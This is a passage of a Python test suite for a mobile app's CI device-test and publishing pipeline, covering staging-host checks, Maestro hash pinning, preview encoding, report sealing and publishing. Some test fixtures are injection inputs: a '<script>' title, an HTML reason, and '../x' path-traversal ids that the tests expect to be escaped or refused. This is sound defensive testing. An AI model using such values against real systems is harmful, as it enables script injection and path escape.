        self.assertEqual(kept, [("android", "sign-in", TOKEN), ("android", "connections", TOKEN)],
                         "after each scenario's recording, with its session so its lines are dropped")
        self.assertIn("May device tests (android): diagnostics kept for 2 scenarios (1 with an ANR, 0 with a crash)",
                      out)
        self.assertNotIn(TOKEN, out)

    def test_the_flow_gets_the_session_in_maestros_environment_never_as_an_argument(self):
        """Run 40051935128: sign-in.yaml's own launchApp with the session got none, so it never signed in."""
        calls, _, _, _ = self.run_it(selection="sign-in")
        maestro = [argv for argv in calls if argv[0] == "/fake/maestro"]
        self.assertEqual(len(maestro), 1)
        self.assertNotIn(TOKEN, " ".join(maestro[0]))
        self.assertEqual([env.get(device_tests.MAESTRO_SESSION) for env in self.maestro_envs], [TOKEN])
        self.assertEqual(device_tests.MAESTRO_SESSION, "MAESTRO_MAY_TEST_SESSION",
                         "Maestro's CLI passes only MAESTRO_-prefixed variables to a flow")

    def test_a_flow_not_tagged_for_this_platform_is_skipped_and_the_run_goes_on(self):
        (self.source / device_tests.FLOWS_DIR / "connections.yaml").write_text(FLOW)
        flow = self.source / device_tests.FLOWS_DIR / "sign-in.yaml"
        flow.write_text(FLOW.replace("  - ios\n", ""))
        _, report, _, _ = self.run_it(selection="sign-in")
        self.assertEqual([row["verdict"] for row in report["scenarios"]], ["ui-pass"], "tagged android: it runs")
        flow.write_text(FLOW.replace("  - android\n", ""))
        calls, report, _, _ = self.run_it()
        self.assertEqual([(row["id"], row["verdict"], row.get("reason")) for row in report["scenarios"]], [
            ("sign-in", "skipped", "skipped (flow not tagged for android)"), ("connections", "ui-pass", device_tests.UNCONFIGURED)])
        self.assertNotIn(str(flow), " ".join(" ".join(argv) for argv in calls), "the untagged flow never ran")

    def test_a_flow_naming_an_id_the_app_lacks_fails_and_never_runs(self):
        (self.source / device_tests.FLOWS_DIR / "connections.yaml").write_text(FLOW)
        flow = self.source / device_tests.FLOWS_DIR / "sign-in.yaml"
        flow.write_text(FLOW + "- tapOn:\n    id: \"demo-sign-in\"\n")
        calls, report, _, _ = self.run_it()
        self.assertEqual([(row["id"], row["verdict"], row.get("reason")) for row in report["scenarios"]], [
            ("sign-in", "fail", device_tests.FLOW_IDS), ("connections", "ui-pass", device_tests.UNCONFIGURED)])
        self.assertNotIn(str(flow), " ".join(" ".join(argv) for argv in calls), "the flow never ran")
        (self.source / "android/app/src/main/SignIn.kt").parent.mkdir(parents=True)
        (self.source / "android/app/src/main/SignIn.kt").write_text('val tag = "demo-sign-in"\n')
        _, report, _, _ = self.run_it()
        self.assertEqual(report["scenarios"][0]["verdict"], "ui-pass", "the app has the id: it runs")

    def test_flow_tags_reads_the_header_alone(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "f.yaml"
            for text, tags in ((FLOW, {"android", "ios"}),
                               ("appId: x\ntags: [android, ios]\n---\n", {"android", "ios"}),
                               ("appId: x\ntags:\n  - android\nname: x\n  - ios\n---\n", {"android"}),
                               ("appId: x\ntags:\n  - android\n  # for both devices\n\n  - ios\n---\n",
                                {"android", "ios"}),
                               ("appId: x\n---\ntags:\n  - ios\n", set()),
                               ("appId: x\ntags:\n  - ../x\n  - ios\n---\n", {"ios"}),
                               ("appId: x\n", set())):
                with self.subTest(text=text):
                    path.write_text(text)
                    self.assertEqual(device_tests.flow_tags(path), tags)

    def test_a_failing_flow_and_server_checks(self):
        (self.source / device_tests.FLOWS_DIR / "connections.yaml").write_text(FLOW)
        listed = json.loads(device_tests.SCENARIOS.read_text())
        next(row for row in listed if row["id"] == "connections")["server"] = [{"get": "/v1/connections", "expect": 200}]
        path = self.root / "scenarios.json"
        path.write_text(json.dumps(listed))
        with patch("device_tests.SCENARIOS", path):
            _, report, _, _ = self.run_it(fail=("sign-in",))
            self.assertEqual([row["verdict"] for row in report["scenarios"]], ["fail", "pass"])
            self.assertEqual(report["scenarios"][1]["server"], [{"get": "/v1/connections", "status": 200, "pass": True}])
            _, report, _, _ = self.run_it(status=500)
            self.assertEqual(report["scenarios"][1]["verdict"], "fail", "a failed server check fails the scenario")

    def test_outward_scenarios_are_skipped_when_switched_off(self):
        listed = json.loads(device_tests.SCENARIOS.read_text())
        listed[0]["outward"] = True
        path = self.root / "scenarios.json"
        path.write_text(json.dumps(listed))
        with patch("device_tests.SCENARIOS", path):
            _, report, _, _ = self.run_it(env={"MAY_DEVICE_TESTS_OUTWARD": "off"})
            self.assertEqual(report["scenarios"][0]["verdict"], "skipped")
            _, report, _, _ = self.run_it()
            self.assertEqual(report["scenarios"][0]["verdict"], "ui-pass")

    def test_an_agent_scenario_runs_the_onboarding_subflow_before_the_agent(self):
        (self.source / device_tests.FLOWS_DIR / "subflows").mkdir()
        (self.source / device_tests.FLOWS_DIR / device_tests.ONBOARDING).write_text("appId: x\n")
        calls = []

        class Process:
            def terminate(self):
                pass

            def wait(self, timeout=None):
                return 0

        def private(argv, log, *, cwd=None, env=None, check=True, timeout=None):
            calls.append((list(argv), timeout))
            return 0

        def agent(cli, goal, tag, device, folder, token, model, **kwargs):
            calls.append((["agent"], None))
            return {}

        with patch.dict(os.environ, self.env, clear=True), \
                patch("device_tests.boot", return_value=("/sdk/adb", Process(), {})), \
                patch("device_tests.maestro", return_value=Path("/fake/maestro")), \
                patch("device_tests.flows.run_private", side_effect=private), \
                patch("device_tests.adb_shell", return_value=0), \
                patch("device_tests.flows.sdk", return_value=Path("/sdk")), \
                patch("device_tests.device_agent.settings", return_value=("t", "m")), \
                patch("device_tests.Recorder", FakeRecorder), patch("device_tests.screenshot", return_value=None), \
                patch("device_tests.head_revision", return_value=SHA), patch("sys.stdout", new_callable=io.StringIO):
            device_tests.run_scenarios("chat", minted=lambda base, secret: TOKEN, agent=agent,
                                       install=lambda root: root / "claude", cleaned=lambda *args: 0,
                                       delivered=lambda *args: None, calls_left=lambda *args: None)
        driven = [argv for argv, _ in calls if argv[0] in ("/fake/maestro", "agent")]
        self.assertEqual(driven, [["/fake/maestro", "--device", device_tests.SERIAL, "test",
                                   str(self.source / device_tests.FLOWS_DIR / device_tests.ONBOARDING)], ["agent"]])
        self.assertIn(device_tests.ONBOARDING_SECONDS, [timeout for argv, timeout in calls if argv[0] == "/fake/maestro"])

    def test_refusals_before_anything_runs(self):
        for env, message in (({"MAY_TEST_SIGNIN_SECRET": None}, "MAY_TEST_SIGNIN_SECRET is not set"),
                             ({"MAY_STAGING_API_URL": "http://staging.example"}, "MAY_STAGING_API_URL is not https://staging-api.usemay.co"),
                             ({"MAY_APP_READ_KEY": "x"}, "A secret for another release step")):
            with self.subTest(message=message):
                with self.assertRaises((DeviceTestsError, store.StoreError)) as refused:
                    self.run_it(env=env)
                self.assertIn(message, refused.exception.args[0])


class StagingHostTests(unittest.TestCase):
    """23 Oct (may-app #104): staging moves to staging-api.usemay.co and api.usemay.co becomes production."""

    def staging(self, value):
        with patch.dict(os.environ, {"MAY_STAGING_API_URL": value} if value is not None else {}, clear=True):
            return device_tests.staging("s" * 32, True)

    def test_staging_alone_is_driven(self):
        for value in ("https://staging-api.usemay.co", "https://staging-api.usemay.co/", " https://staging-api.usemay.co\n"):
            with self.subTest(value=value):
                self.assertEqual(self.staging(value), "https://staging-api.usemay.co")

    def test_production_and_any_other_host_are_refused(self):
        for value in ("https://api.usemay.co", "https://api.usemay.co/", "http://staging-api.usemay.co",
                      "https://staging-api.usemay.co.example", "https://staging-api.usemay.co/v1",
                      "https://STAGING-API.usemay.co", "https://staging.example", "", None):
            with self.subTest(value=value), self.assertRaises(DeviceTestsError) as refused:
                self.staging(value)
            self.assertEqual(refused.exception.args[0],
                             "MAY_STAGING_API_URL is not https://staging-api.usemay.co in may-device-tests")

    def test_the_smoke_scenario_needs_no_staging(self):
        with patch.dict(os.environ, {"MAY_STAGING_API_URL": "https://api.usemay.co"}, clear=True):
            self.assertEqual(device_tests.staging("", False), "")


class ToolTests(unittest.TestCase):
    def test_maestro_is_refused_unless_its_hash_matches(self):
        with tempfile.TemporaryDirectory() as directory:
            root, private = Path(directory), Path(directory) / "may-private"
            private.mkdir()

            def curl(argv, log, **kwargs):
                Path(argv[argv.index("-o") + 1]).write_bytes(b"not the pinned release")
                return 0

            with patch("device_tests.flows.run_private", side_effect=curl):
                try:
                    device_tests.maestro(root, private, private / "log")
                except DeviceTestsError as refused:
                    self.assertEqual(refused.args[0], "The Maestro download's hash differs; no scenario ran")
                except Exception as error:
                    self.fail("refused only by accident: " + type(error).__name__)
                else:
                    self.fail("an unpinned Maestro was accepted")
            self.assertFalse((root / "may-maestro").exists())

    def test_recordings_are_one_file_or_numbered_parts(self):
        with tempfile.TemporaryDirectory() as directory:
            folder, pulled = Path(directory), []

            def private(argv, log, **kwargs):
                pulled.append(argv)
                return 0

            recorder = device_tests.Recorder("/sdk/adb", {}, "chat", folder / "log")
            for parts, names in ((1, ["chat.mp4"]), (2, ["chat-part1.mp4", "chat-part2.mp4"])):
                recorder.parts = parts
                with patch("device_tests.flows.run_private", side_effect=private):
                    self.assertEqual(recorder.stop(folder), names)
            self.assertIn(["/sdk/adb", "shell", "pkill", "-2", "screenrecord"], pulled)


class DevicePreviewTests(unittest.TestCase):
    """Review of #88: previews are made in the device job (which already runs may-app code, and holds no publish
    secret), before the seal; nothing in that step ever fails the job."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        self.folder = self.root / device_tests.OUT / RUN / "android"
        self.folder.mkdir(parents=True)
        for name in ("sign-in.mp4", "notes-part1.mp4", "notes-part2.mp4", "chat.mp4", "sign-in-end.png"):
            (self.folder / name).write_bytes(MP4)
        # Keyed by the report's rows: "routines-part2" is an id here, not the second part of "routines".
        (self.folder / "routines-part2.mp4").write_bytes(MP4)
        rows = [{"id": "sign-in", "videos": ["sign-in.mp4"]}, {"id": "notes", "videos": ["notes-part1.mp4",
                                                                                         "notes-part2.mp4"]},
                {"id": "chat", "videos": ["chat.mp4"]}, {"id": "routines-part2", "videos": ["routines-part2.mp4"]},
                {"id": "poll", "videos": []}, {"id": "../x", "videos": ["sign-in.mp4"]}]
        (self.folder / "report.json").write_text(json.dumps({"device": "android", "scenarios": rows}))

    def tearDown(self):
        self.directory.cleanup()

    def previews(self, encoder, platform="android"):
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            try:
                device_tests.make_previews(platform, encoder=encoder)
            except Exception as error:
                self.fail(f"the previews step failed the job: {type(error).__name__}")
        return out.getvalue().strip()

    def test_each_scenarios_first_recording_gets_a_preview_and_a_bad_one_is_left_out(self):
        seen = []

        def encode(video, target):
            seen.append(video.name)
            if video.name == "chat.mp4":
                target.write_bytes(b"not an mp4")  # made, but not a video: left out
                return True
            if video.name == "notes-part1.mp4":
                raise OSError("encoder crashed")
            target.write_bytes(MP4)
            return True

        self.assertEqual(self.previews(encode), "May device tests (android): 2 previews made, 2 failed")
        self.assertEqual(sorted(seen), ["chat.mp4", "notes-part1.mp4", "routines-part2.mp4", "sign-in.mp4"])
        self.assertEqual(sorted(p.name for p in self.folder.iterdir() if p.name.endswith(device_tests.PREVIEW)),
                         ["routines-part2.preview.mp4", "sign-in.preview.mp4"],
                         "re-review of #88: an id ending -partN keeps its own preview")

    def test_a_preview_reaches_the_run_folder_only_whole(self):
        """Run 40075535088: a step stopped by its timeout must never leave a half-written preview to be sealed."""
        given = []

        def encode(video, target):
            given.append(target)
            target.write_bytes(MP4[:6])  # what a kill mid-encode would leave behind
            if video.name == "chat.mp4":
                raise KeyboardInterrupt  # stands for the step's timeout stopping it here
            target.write_bytes(MP4)
            return True

        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), self.assertRaises(KeyboardInterrupt):
            device_tests.previews_in("android", encode)
        self.assertTrue(given and all(self.folder not in path.parents for path in given),
                        "each preview is made outside the run folder")
        self.assertNotIn("chat.preview.mp4", [p.name for p in self.folder.iterdir()],
                         "the half-written preview never reaches the run folder")
        self.assertIn("sign-in.preview.mp4", [p.name for p in self.folder.iterdir()], "a whole one is moved in")

    def test_no_preview_starts_after_the_step_budget(self):
        ticks = iter([0, 0, device_tests.PREVIEW_STEP_SECONDS + 1, device_tests.PREVIEW_STEP_SECONDS + 2,
                      device_tests.PREVIEW_STEP_SECONDS + 3])
        seen = []

        def encode(video, target):
            seen.append(video.name)
            target.write_bytes(MP4)
            return True

        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True):
            made, failed = device_tests.previews_in("android", encode, clock=lambda: next(ticks))
        self.assertEqual((made, failed, seen), (1, 3, ["sign-in.mp4"]),
                         "after PREVIEW_STEP_SECONDS the rest are left out, so the step ends before its timeout")

    def test_any_error_is_contained_so_the_seal_always_runs(self):
        """Re-review of #88: an OSError outside the encoder (stat, unlink, mkdir) failed the step."""
        def encode(video, target):
            target.write_bytes(MP4)
            return True

        with patch("device_tests.Path.stat", side_effect=OSError(5, "I/O error")):
            self.assertTrue(self.previews(encode).startswith("May device tests (android): "),
                            "a fixed line, never an exception")
        with patch("device_tests.previews_in", side_effect=OSError(28, "No space left")):
            self.assertEqual(self.previews(encode),
                             "May device tests (android): no previews (an error stopped them; the seal goes on)")

    def test_no_encoder_or_no_recording_never_fails_the_job(self):
        with patch("device_tests.ffmpeg_encoder", side_effect=DeviceTestsError("ffmpeg did not install")):
            self.assertEqual(self.previews(None), "May device tests (android): no previews (the encoder is unavailable)")
        self.assertEqual(self.previews(lambda v, t: True, platform="ios"), "May device tests (ios): no recordings, so "
                                                                            "no previews")

    def test_android_encodes_with_apts_ffmpeg_at_270px_silent_never_overwriting(self):
        calls = []
        with patch("device_tests.flows.run_private", side_effect=lambda argv, log, **k: calls.append(argv) or 0):
            encode = device_tests.ffmpeg_encoder(self.root, self.root / "log")
            encode(self.folder / "sign-in.mp4", self.folder / "sign-in.preview.mp4")
        self.assertEqual(calls[1][-1], "ffmpeg", "apt's current ffmpeg, not a pinned old one")
        argv = calls[2]
        self.assertEqual(argv[argv.index("-vf") + 1], "setpts=PTS/1.0000,fps=8,scale=270:-2",
                         "a recording with no readable length plays at its own speed, cut at PREVIEW_MAX_SECONDS")
        self.assertIn("-an", argv)
        for flag, value in (("-crf", "34"), ("-maxrate", "160000"), ("-t", "60")):
            self.assertEqual(argv[argv.index(flag) + 1], value)
        self.assertEqual(argv[-2:], ["-n", str(self.folder / "sign-in.preview.mp4")])

    def test_ios_compiles_preview_swift_with_the_pinned_xcode(self):
        import device_ios
        built = []
        encode = device_ios.preview_encoder(self.root / "log", tool=lambda argv, log, env, timeout: built.append(
            (argv, env, timeout)) or Done(0))
        argv, env, timeout = built[0]
        self.assertEqual(timeout, device_ios.COMPILE_SECONDS, "re-review of #88: the compile is bounded")
        self.assertEqual(argv[:3], ["xcrun", "swiftc", "-O"])
        self.assertTrue(argv[-1].endswith("preview.swift") and Path(argv[-1]).is_file())
        self.assertEqual(env["DEVELOPER_DIR"], str(device_ios.renders.XCODE))
        with patch("renders.quiet", return_value=Done(0)) as quiet:
            self.assertTrue(encode(self.folder / "sign-in.mp4", self.folder / "sign-in.preview.mp4"))
        self.assertEqual(quiet.call_args.args[0][1:], [str(self.folder / "sign-in.mp4"),
                                                        str(self.folder / "sign-in.preview.mp4"), "270", "60", "8",
                                                        "160000"])

    def test_a_long_recording_becomes_a_timelapse_within_the_ceiling(self):
        """Run 40075535088: a 10-minute iOS chat preview came to 15.9 MB, over the artifact's 15 MB limit."""
        def mp4(seconds, scale=1000, wide=False):
            if wide:
                mvhd = bytes([1, 0, 0, 0]) + bytes(16) + scale.to_bytes(4, "big") + (seconds * scale).to_bytes(8, "big")
            else:
                mvhd = bytes(4) + bytes(8) + scale.to_bytes(4, "big") + (seconds * scale).to_bytes(4, "big")
            mvhd += bytes(80)
            moov = (8 + 8 + len(mvhd)).to_bytes(4, "big") + b"moov" + (8 + len(mvhd)).to_bytes(4, "big") + b"mvhd" + mvhd
            return b"\0\0\0\x18ftypmp42" + bytes(12) + moov

        path = self.root / "long.mp4"
        for seconds, wide in ((600, False), (600, True), (30, False)):
            with self.subTest(seconds=seconds, wide=wide):
                path.write_bytes(mp4(seconds, wide=wide))
                self.assertEqual(device_tests.mp4_seconds(path), seconds)
        path.write_bytes(MP4)
        self.assertIsNone(device_tests.mp4_seconds(path), "a file with no moov has no length")
        self.assertEqual([device_tests.timelapse(s) for s in (600, 60, 30, None)], [10.0, 1.0, 1.0, 1.0])
        path.write_bytes(mp4(600))
        calls = []
        with patch("device_tests.flows.run_private", side_effect=lambda argv, log, **k: calls.append(argv) or 0):
            device_tests.ffmpeg_encoder(self.root, self.root / "log")(path, self.root / "out.mp4")
        self.assertIn("setpts=PTS/10.0000,fps=8", calls[-1][calls[-1].index("-vf") + 1])
        # 60 seconds at about 160 kbit/s is about 1.2 MB: under the ceiling, which stays at 2 MB.
        self.assertLessEqual(device_tests.PREVIEW_MAX_SECONDS * device_tests.PREVIEW_BITRATE / 8 * 1.5,
                             device_tests.MAX_PREVIEW)
        self.assertLessEqual(device_tests.MAX_PREVIEW, 2 * 1024 * 1024, "a preview stays under about 2 MB")
        self.assertLessEqual(device_tests.PREVIEW_FPS, 8)

    def test_a_preview_over_the_ceiling_is_left_out(self):
        def encode(video, target):
            target.write_bytes(MP4 + bytes(device_tests.MAX_PREVIEW))
            return True

        self.assertEqual(self.previews(encode), "May device tests (android): 0 previews made, 4 failed")
        self.assertFalse([p for p in self.folder.iterdir() if p.name.endswith(device_tests.PREVIEW)])


class ReasonTests(unittest.TestCase):
    """Run 40057045702: a full run's iOS budget-skipped row carried a reason publish.py did not accept, so device-open
    refused the whole report and nothing was published."""

    def written_reasons(self):
        """Every reason device_tests.py can write into a report row, read from its source."""
        tree = ast.parse(Path(device_tests.__file__).read_text())
        values = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign) and any(isinstance(t, ast.Subscript) and isinstance(t.slice, ast.Constant)
                                                    and t.slice.value == "reason" for t in node.targets):
                values.append(node.value)
            if isinstance(node, ast.keyword) and node.arg == "reason":
                values.append(node.value)
            if isinstance(node, ast.Dict):
                values += [v for k, v in zip(node.keys, node.values) if isinstance(k, ast.Constant) and k.value == "reason"]
        reasons = set()
        for value in values:
            if isinstance(value, ast.Constant):
                reasons.add(value.value)
            elif isinstance(value, ast.Name):
                reasons.add(getattr(device_tests, value.id))
            elif isinstance(value, ast.Subscript) and isinstance(value.value, ast.Name) and \
                    isinstance(value.slice, ast.Constant) and hasattr(device_tests, value.value.id):
                reasons.add(getattr(device_tests, value.value.id)[value.slice.value])
            elif isinstance(value, ast.IfExp):
                reasons |= {getattr(device_tests, v.id) if isinstance(v, ast.Name) else v.value
                            for v in (value.body, value.orelse)}
            else:
                reasons.add(ast.unparse(value))  # a reason worked out at run time must be added here by hand
        # The judge step copies combined()'s reason, whose own values are read above from its returned dicts.
        # Accounts.session's reason is a FreshRefused's own: FRESH_EXHAUSTED or NOT_FRESH.
        if "self.refused" in reasons:
            reasons |= {device_tests.FreshExhausted.reason, device_tests.FreshRefused.reason}
        return reasons - {None, "verdict_reason['reason']", "self.refused"}

    def test_every_reason_a_device_job_writes_is_one_publish_accepts(self):
        written = self.written_reasons()
        self.assertIn(device_tests.BUDGET, written)
        self.assertIn(device_tests.UNTAGGED["android"], written)
        self.assertEqual(written - set(publish.REASONS), set())

    def test_a_budget_skipped_row_passes_the_publish_check(self):
        report = {"device": "ios", "scenarios": [{"id": "poll-skip", "title": "x", "verdict": "skipped",
                                                    "reason": device_tests.BUDGET, "videos": [], "screenshots": [],
                                                    "server": []}]}
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "report.json"
            path.write_text(json.dumps(report))
            try:
                _, rows = publish.device_report(path, set(), {"poll-skip": "Skip May's question"})
            except publish.PublishError as error:
                self.fail(f"device-open refused a budget-skipped row: {error}")
        self.assertEqual(rows[0]["reason"], device_tests.BUDGET)


class SealVerdictTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        folder = self.root / device_tests.OUT / RUN / "android"
        folder.mkdir(parents=True)
        (folder / "report.json").write_text("{}")
        (folder / "sign-in.mp4").write_bytes(MP4)
        (self.root / "may-private").mkdir()

    def tearDown(self):
        self.directory.cleanup()

    def test_seal(self):
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            try:
                device_tests.seal()
            except DeviceTestsError as error:
                self.fail("an unset recipient is reported, not refused: " + error.args[0])
        self.assertIn("MAY_RENDERS_RECIPIENT is not set in may-device-tests; nothing was sealed", out.getvalue())
        seen = {}

        def age(argv, **kwargs):
            with tarfile.open(argv[-1]) as archive:
                seen["names"] = archive.getnames()
            Path(argv[argv.index("-o") + 1]).write_bytes(b"sealed")
            return subprocess.CompletedProcess(argv, 0)

        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_RENDERS_RECIPIENT": RECIPIENT}, clear=True), \
                patch("device_tests.toolchain.tool_path", return_value="/fake/age"), \
                patch("device_tests.subprocess.run", side_effect=age), patch("sys.stdout", new_callable=io.StringIO):
            device_tests.seal()
        self.assertEqual(seen["names"], [RUN, RUN + "/android", RUN + "/android/report.json", RUN + "/android/sign-in.mp4"])
        self.assertEqual(sorted(p.name for p in (self.root / device_tests.SEALED).iterdir()), ["android.age"])

    def test_verdict(self):
        verdicts = self.root / "may-private" / device_tests.VERDICTS
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), patch("sys.stdout", new_callable=io.StringIO):
            verdicts.write_text(json.dumps(["pass", "ui-pass", "skipped"]))
            device_tests.verdict()
            verdicts.write_text(json.dumps(["pass", "fail"]))
            with self.assertRaises(DeviceTestsError):
                device_tests.verdict()


def device_tar(entries):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w") as archive:
        for name, data in entries:
            info = tarfile.TarInfo(name)
            if data is None:
                info.type = tarfile.DIRTYPE
                archive.addfile(info)
            else:
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
    return stream.getvalue()


REPORT = {"run": RUN, "device": "android", "scenarios": [
    {"id": "sign-in", "title": "<script>x</script>", "verdict": "ui-pass", "reason": "server checks not configured",
     "videos": ["sign-in.mp4"], "screenshots": ["sign-in-end.png"], "server": [], "seconds": 40},
    {"id": "connections", "verdict": "fail", "videos": [], "screenshots": [],
     "server": [{"get": "/v1/connections", "status": 500, "pass": False}]}]}


class PublishDeviceTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        (self.root / publish.DEVICE_DOWNLOAD).mkdir()
        (self.root / publish.DEVICE_DOWNLOAD / "android.age").write_bytes(b"sealed")

    def tearDown(self):
        self.directory.cleanup()

    def open_with(self, entries):
        def decrypt(sealed, plain, identity, recipient, private):
            plain.write_bytes(device_tar(entries))

        key = "AGE-SECRET-KEY-1" + "Q" * 58
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_RENDERS_DECRYPT_KEY": key,
                                     "MAY_RENDERS_RECIPIENT": RECIPIENT, "GITHUB_RUN_ID": "9",
                                     "GITHUB_RUN_ATTEMPT": "2"}, clear=True), \
                patch("publish.decrypt", side_effect=decrypt), patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.open_device()
            self.assertNotIn("MAY_RENDERS_DECRYPT_KEY", os.environ)
        return self.root / publish.TREE / RUN, out.getvalue()

    GOOD = [(RUN, None), (RUN + "/android", None), (RUN + "/android/report.json", json.dumps(REPORT).encode()),
            (RUN + "/android/sign-in.mp4", MP4), (RUN + "/android/sign-in-end.png", png()),
            (RUN + "/android/sign-in.xml", b"<testsuites/>")]

    def test_the_report_is_checked_and_the_readme_built_here(self):
        tree, out = self.open_with(self.GOOD)
        self.assertEqual(out.strip(), f"May device tests decrypted and checked: run folder device-tests/{RUN}/ with 2 "
                                      "scenario reports from 1 devices")
        readme = (tree / "README.md").read_text()
        self.assertIn("## sign-in: Sign in with an injected test session", readme)
        self.assertIn("**android: ui-pass** (server checks not configured)", readme)
        self.assertIn('<img src="android/sign-in-end.png" width="300">', readme)
        self.assertIn("[Recording: sign-in.mp4](https://github.com/May-Assistant/may-renders/releases/download/device-tests-" + RUN + "/android-sign-in.mp4)", readme)
        self.assertIn("encrypted artifact may-device-<device>-2 of "
                      "https://github.com/May-Assistant/may-releases/actions/runs/9 holds them for 7 days", readme)
        self.assertEqual(list(tree.rglob("*.mp4")), [], "recordings never enter may-renders history")
        moved = self.root / "may-private" / publish.VIDEOS / RUN / "android" / "sign-in.mp4"
        self.assertTrue(moved.is_file() and moved.read_bytes() == MP4, "moved aside for device-release")
        self.assertIn("GET /v1/connections: 500", readme)
        self.assertNotIn("<script>", readme + (tree / "index.html").read_text())
        page = (tree / "index.html").read_text()
        self.assertIn('<a href="https://github.com/May-Assistant/may-renders/releases/download/device-tests-' + RUN +
                      '/android-sign-in.mp4">Recording: sign-in.mp4</a>', page)
        self.assertIn("may-device-&lt;device&gt;-2", page)
        self.assertNotIn("<video", page)

    def test_anything_outside_the_layout_or_report_shape_is_refused(self):
        def report(**change):
            rows = [dict(REPORT["scenarios"][0], **change)]
            return (RUN + "/android/report.json", json.dumps(dict(REPORT, scenarios=rows)).encode())

        cases = {
            "other device folder": self.GOOD + [(RUN + "/ios", None)],
            "unknown file": self.GOOD + [(RUN + "/android/run.sh", b"x")],
            "not an mp4": self.GOOD[:3] + [(RUN + "/android/sign-in.mp4", b"not a video")] + self.GOOD[4:],
            "unknown scenario": self.GOOD[:2] + [report(id="elsewhere")] + self.GOOD[3:],
            "unknown verdict": self.GOOD[:2] + [report(verdict="great")] + self.GOOD[3:],
            "free-text reason": self.GOOD[:2] + [report(reason="<b>hi</b>")] + self.GOOD[3:],
            "missing video": self.GOOD[:2] + [report(videos=["other.mp4"])] + self.GOOD[3:],
            "bad run folder": [("main", None), ("main/android", None), ("main/android/report.json", b"{}")],
        }
        for label, entries in cases.items():
            with self.subTest(label=label):
                shutil.rmtree(self.root / publish.TREE, ignore_errors=True)
                try:
                    self.open_with(entries)
                except PublishError:
                    self.assertFalse((self.root / publish.TREE).exists())
                    continue
                self.fail(label + ": published")

    def test_push_goes_under_device_tests_and_keeps_its_own_runs(self):
        self.open_with(self.GOOD)
        calls, work = [], self.root / "may-publish-git"

        def git(argv, log, env, cwd, capture=False):
            calls.append(argv)
            if argv[0] == "init":
                Path(argv[-1]).mkdir()
            if argv[0] == "checkout":
                (work / "device-tests").mkdir()
                old = [{"folder": "202610%02d-%012x" % (n, n)} for n in range(1, 11)]
                (work / "device-tests" / "runs.json").write_text(json.dumps(old))
                for run in old:
                    (work / "device-tests" / run["folder"]).mkdir()
                (work / "runs.json").write_text(json.dumps([{"folder": "b" * 12}]))
            return b"abc\trefs/heads/main\n" if argv[0] == "ls-remote" else b""

        key = "-----BEGIN OPENSSH PRIVATE KEY-----\n" + "A" * 120 + "\n-----END OPENSSH PRIVATE KEY-----"
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_APP_RENDERS_WRITE_KEY": key,
                                     "GITHUB_RUN_ID": "9"}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.push_device(run_git=git)
        kept = json.loads((work / "device-tests" / "runs.json").read_text())
        self.assertEqual(kept[0], {"folder": RUN, "run": "9"})
        self.assertEqual(len(kept), 10)
        self.assertIn(["rm", "-r", "-q", "--ignore-unmatch", "--", "device-tests/20261010-00000000000a"], calls)
        self.assertEqual(json.loads((work / "runs.json").read_text()), [{"folder": "b" * 12}], "renders' list untouched")
        self.assertTrue((work / "device-tests" / RUN / "android" / "sign-in-end.png").is_file())
        self.assertFalse((work / "device-tests" / RUN / "android" / "sign-in.mp4").exists())
        self.assertEqual([argv for argv in calls if argv[0] == "push"], [["push", "--quiet", "origin", "HEAD:refs/heads/main"]])
        self.assertEqual(out.getvalue().splitlines(), [
            f"May device tests published to may-renders as device-tests/{RUN}/ (10 run folders kept, 1 removed)",
            "May device tests: no flow board (may-app's flows.json is missing or malformed)"])
        # The run is recorded in the board's history even without a board, its end screen kept beside it.
        history = json.loads((work / "device-tests" / "history.json").read_text())
        self.assertEqual([(item["folder"], item["run"]) for item in history], [(RUN, "9")])
        self.assertTrue((work / "device-tests" / "board" / "media" / RUN / "android" / "sign-in-end.png").is_file())

    def test_the_flow_board_is_built_from_the_sealed_may_app_files_which_are_never_committed(self):
        flows = {"flows": [{"id": "2", "title": "Sign in and out", "scenarios": ["sign-in"], "components": []}]}
        notes = {"results": {"android/sign-in": {"headline": "Signs in"}}}
        tree, _ = self.open_with(self.GOOD + [(RUN + "/android/flows.json", json.dumps(flows).encode()),
                                              (RUN + "/android/board-notes.json", json.dumps(notes).encode())])
        self.assertFalse((tree / "android" / "flows.json").exists())
        self.assertFalse((tree / "android" / "board-notes.json").exists())
        work = self.root / "may-publish-git"

        def git(argv, log, env, cwd, capture=False):
            if argv[0] == "init":
                Path(argv[-1]).mkdir()
            return b""

        key = "-----BEGIN OPENSSH PRIVATE KEY-----\n" + "A" * 120 + "\n-----END OPENSSH PRIVATE KEY-----"
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_APP_RENDERS_WRITE_KEY": key,
                                     "GITHUB_RUN_ID": "9"}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.push_device(run_git=git)
        self.assertEqual(out.getvalue().splitlines()[-1], "May device tests: the flow board is device-tests/board/ in may-renders")
        page = (work / "device-tests" / "board" / "index.html").read_text()
        data = json.loads(page.split('id="board-data">')[1].split("</script>")[0])
